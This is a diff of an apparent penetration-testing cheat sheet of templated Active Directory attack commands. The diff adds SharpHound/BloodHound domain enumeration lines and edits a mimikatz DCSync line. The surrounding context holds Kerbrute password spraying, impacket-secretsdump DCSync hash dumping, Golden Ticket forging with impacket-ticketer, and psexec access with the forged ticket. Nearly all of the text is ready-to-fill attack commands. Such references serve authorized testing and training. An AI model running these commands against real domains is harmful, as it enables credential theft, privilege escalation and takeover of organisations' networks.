@@ -193,6 +193,8 @@ Kerbrute:/home/kali/Tools/windows/kerbrute_linux_amd64 bruteuser -d <domain> --d
 Kerbrute:/home/kali/Tools/windows/kerbrute_linux_amd64 passwordspray -d <domain> --dc <dc-ip> users.txt <password> # Password spray; kali-machine
 Username Anarchy:/home/kali/Tools/git-tools/username-anarchy/username-anarchy -i <wordlist1> # Generate username permutations; kali-machine
 Username Anarchy:/home/kali/Tools/git-tools/username-anarchy/username-anarchy --recognise <user> # Analyze username scheme; kali-machine
+SharpHound.ps1:. .\SharpHound.ps1 # Dot-source SharpHound for BloodHound data collection; target-machine
+SharpHound.ps1:Invoke-BloodHound -CollectionMethod All # Run all BloodHound collection methods; target-machine
 SharpHound.ps1:Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\Public -OutputPrefix bh #collect full AD enumeration dataset and save BloodHound JSON output to writable Public directory; target-machine
 SharpHound.ps1:Invoke-BloodHound -CollectionMethod All -Domain <domain> -OutputDirectory C:\Users\Public -OutputPrefix bh #enumerate full domain data explicitly when multiple domains or trust scenarios exist; target-machine
 SharpHound.ps1:Invoke-BloodHound -CollectionMethod All -Stealth -OutputDirectory C:\Users\Public -OutputPrefix bh #run full collection with stealth mode to reduce noisy queries against domain controllers; target-machine
@@ -282,7 +284,7 @@ DCSync # 1:Add-DomainObjectAcl -TargetIdentity "DC=<domain>,DC=<tld>" -Principal
 DCSync # 1:impacket-secretsdump -just-dc-ntlm '<domain>/<user>:<password>'@<dc-ip> # DCSync attack; kali-machine
 DCSync # 2:impacket-secretsdump -k -no-pass -dc-ip <dc-ip> <domain>/@<dc-ip> # DCSync with Kerberos ticket; kali-machine
 DCSync # 2:impacket-secretsdump -just-dc-ntlm '<domain>/<user>':'<password>'@<target> # Domain Controller NTDS dump; kali-machine
-DCSync # 3:.\mimikatz.exe "lsadump::dcsync /domain:<domain> /user:krbtgt" # DCSync with mimikatz on target; target-machine
+DCSync # 3:.\mimikatz.exe "lsadump::dcsync /domain:<domain> /user:<user>" # DCSync with mimikatz on target; target-machine
 Golden Ticket # 1:impacket-ticketer -nthash <krbtgt_ntlm> -domain-sid <domain_sid> -domain <domain> Administrator # Forge Golden Ticket; kali-machine
 Golden Ticket # 1:export KRB5CCNAME=/path/to/Administrator.ccache # Set ticket cache; kali-machine
 Golden Ticket # 1:impacket-psexec -k -no-pass <domain>/Administrator@<target> # Use Golden Ticket to access target; kali-machine
